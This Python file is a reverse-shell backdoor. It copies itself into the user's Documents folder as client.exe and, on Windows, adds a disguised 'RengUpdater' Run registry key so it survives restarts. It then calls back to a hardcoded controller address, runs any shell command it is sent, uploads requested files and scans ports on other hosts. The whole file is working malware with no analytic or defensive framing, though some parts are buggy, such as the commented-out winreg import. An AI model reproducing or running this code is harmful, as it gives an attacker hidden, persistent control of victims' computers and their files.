import socket
import subprocess
import os
import platform
import sys
import time
import random
##import winreg as wreg
import shutil

if 'Windows' in platform.system():
    Null, userprof = subprocess.check_output('set USERPROFILE', shell=True,stdin=subprocess.PIPE,  stderr=subprocess.PIPE).decode().split('=') # For Windows
    destination = userprof.strip('\n\r') + '\\Documents\\' + 'client.exe'
elif 'Linux' in platform.system() or 'Darwin'in platform.system():
    userprof = subprocess.check_output('whoami', shell=True,stdin=subprocess.PIPE,  stderr=subprocess.PIPE).decode().strip('\n')
    destination = '/Users/'+userprof+'/Documents/' + 'client.exe'

if not os.path.exists(destination):
    if 'Windows' in platform.system():
        key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_ALL_ACCESS)
        wreg.SetValueEx(key, 'RengUpdater', 0, wreg.REG_SZ, destination)
        key.Close()
    

    shutil.copyfile(sys.argv[0], destination) 
 

def scanner(s, ip, ports):
    scan_result = '' # scan_result is a variable stores our scanning result
    for port in ports.split(','):
        try: # we will try to make a connection using socket library for EACH one of these ports
            sock =  socket.socket()
#connect_ex This function returns 0 if the operation succeeded,  and in our case operation succeeded means that the connection happens whihch means the port is open otherwsie the port could be closed or the host is unreachable in the first place.
            output = sock.connect_ex((ip, int(port)))
            if output == 0:
                scan_result = scan_result + "[+] Port " + port + " is opened" + "\n"
            else:
                scan_result = scan_result + "[-] Port " + port + " is closed"
                sock.close()
        except Exception as e:
            pass
    s.send(scan_result.encode())
    
def transfer(s, path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while packet:
            s.send(packet)
            packet = f.read(1024)
        s.send('DONE'.encode())
        f.close()
    else:
        s.send('Unable to find out the file'.encode())


def connect(ip):
    s = socket.socket()
    s.connect((ip,8080))
    while True:
        command = s.recv(1024)
        if 'terminate' in command.decode():
            return 1
            
        elif 'grab' in command.decode(): # syntax: grab*file.txt
            grab,path = command.decode().split('*')
            try:
                transfer(s,path)
            except Exception as e:
                s.send(str(e).encode())
                pass
        elif 'scan' in command.decode(): # syntax: scan 10.10.10.100:22,80
            command = command[5:].decode() #slice the leading first 5 char 
            ip, ports = command.split(':')
            scanner(s, ip, ports)   
        elif 'cd' in command.decode():
            code,directory=command.decode().split('*')  # the formula here is gonna be cd*directory
            try:
                os.chdir(directory) # changing the directory 
                s.send(('[+] CWD is ' + os.getcwd()).encode()) # we send back a string mentioning the new CWD
            except Exception as e:
                s.send(('[-]  ' + str(e)).encode())
        else:
            CMD = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send(CMD.stdout.read())
            s.send(CMD.stderr.read())

##def main():
##    ip = socket.gethostbyname('testdns.ddns.net')
 #   ip = "192.168.1.30"
 #   connect(ip)
while True:
    try:
        if connect("192.168.1.97") == 1:
            s.close()
            break
    except:
        sleep_for = random.randrange(1,10)
        time.sleep(int(sleep_for))
        pass
